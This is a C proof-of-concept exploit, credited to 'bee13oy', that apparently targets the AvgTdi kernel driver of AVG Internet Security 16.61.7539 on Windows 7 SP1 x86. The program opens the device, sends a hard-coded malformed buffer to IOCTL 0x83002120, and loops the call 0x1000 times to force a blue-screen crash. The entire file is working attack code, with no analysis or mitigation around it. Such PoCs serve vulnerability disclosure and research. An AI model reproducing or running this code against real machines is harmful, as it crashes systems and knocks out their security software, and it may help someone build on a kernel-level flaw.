/**
* Author: bee13oy
* BSoD on Windows 7 SP1 x86 + AVG Internet Security 16.61.7539
**/

#include <Windows.h>

HANDLE OpenDevice(const char* szDeviceName) {
	CHAR szOpenDeviceName[0x200] = "";
	sprintf(szOpenDeviceName, "\\\\.\\%s", szDeviceName);
	HANDLE hDevice = CreateFileA(szOpenDeviceName, 
		GENERIC_READ | GENERIC_WRITE, 
		0, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);

	if(hDevice == INVALID_HANDLE_VALUE) {
		hDevice = CreateFileA(szOpenDeviceName, 
			GENERIC_READ, 
			0, 
			NULL, 
			OPEN_EXISTING, 
			0, 
			NULL
			);
	}
	return hDevice;
}

void BSoD(const char* szDeviceName)
{
	HANDLE hFile = OpenDevice(szDeviceName);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD nbBytes = 0;
		CHAR bufOutput[0x1000+1] = "\x00"; 
		CHAR bufInput[0x1000+1] = "\x01\x00\x00\x80\x8f\x5a\x00\xff\xff\xff\xff\xfe\xff\xff\xff\x43\x00\x00\x00\x00\x00\x00\x00\xf6\x00\x8f\x88\xfd\x69\x00\x00\x00\x78\x0c\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x11\x43\x78\x19\x00\x00\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xfe\x7f\x00\x19\x00\x00\x00\x9f\x19\xa6\xde\x00\x00\x00\x00\x00\x00\x00\x00\xc7\x00\x00\x00\x85\x4f\x00\x00\x00\x00\x00\xc9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x5a\x97\xc3\x00\xc5\x14\x45\xcb\x5b\xd7\x00\x00\x00\x00\x00\x63\x00\x00\x25\xec\xc4\x57\xf3\x00\x00\x00\x00\x00\x00\xff\x3f\x00\x00\x00\x00\x2a\x73\xcc\xe1\x49\x00\x00\x00\x00\x00\x00\x00\x7f\x00\x00\x00\x00\x00\xc1\x00\x00\x00\x9f\xdc\xc3\xce\x00\xac\x00\x00\x00\x00\x83\xbf\x00\x00\x00\xc1\xf3\x00\x00\x00\x00\x00\xe8\x00\x00\x38\x00\x00\x00\x00\x04\x14\xc5\x5b\x00\x00\x00\x00\x00\x00\x00\xaa\x00\x00\x00\xe0\x0d\xc5\xdd\x2d\x00\x00\x00\xfa\x62\x73\x36\x00\x00\x00\xe7\x4a\x00\x00\x00\x00\x00\x40\x00\x00\x00\xa3\x00\x00\x62\x00\x00\x00\x01\x80\x00\x00\xb2\x00\x00\x00\xb2\x15\x00\x80\x00\x00\x00\x12\xac\x00\x00\x00\x6d\x79\x9e\x39\x00\x00\x00\x54\x00\x00\x00\x00\x00\x00\x00\x00\x47\xff\xff\xff\x7f\x00\x5f\xb0\x23\x82\x00\x00\x00\x80\xa0\x55\x01\xa4\x00\x04\x3f\x1d\x8c\x81\x11\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3d\x00\x00\x00\x00\x00\x26\x32\x22\xa0\xdd\x51\x00\x00\x00\x00\x00\x00\x00\xf2\x00\x00\x00\x00\x70\xef\x0b\x00\x8b\x65\x2b\x04\xc8\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x67\x00\x48\x00\x00\x00\x00\x00\x00\x00\x7f\x00\x00\x00\x00\xe2\x00\x00\x00\xff\x3f\x00\x00\xe7\x23\x71\x2f\x00"; 
		DeviceIoControl(
			hFile, 
			0x83002120, 
			bufInput, 
			0x00000183, 
			bufOutput, 
			0x000004fc, 
			&nbBytes, 
			NULL
			);
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	DWORD dwCount = 0;
	do 
	{
		BSoD("AvgTdi");
	} while (dwCount++ < 0x1000);

	return 0;
}
